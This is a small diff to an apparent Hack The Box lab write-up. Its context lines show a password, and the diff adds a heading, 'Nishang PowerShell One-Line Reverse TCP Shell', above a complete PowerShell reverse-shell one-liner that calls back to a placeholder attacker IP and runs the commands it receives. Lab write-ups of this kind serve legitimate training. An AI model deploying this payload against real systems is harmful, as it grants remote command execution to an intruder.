@@ -166,6 +166,8 @@ Password: 4Cc3ssC0ntr0ller
 
 The script should look like:
 ![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/ecc6375d-aa15-4a90-85ee-29593524ee66)
+
+Nishang PowerShell One-Line Reverse TCP Shell
 ```CSS
 $client = New-Object System.Net.Sockets.TCPClient('<attacker_IP>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
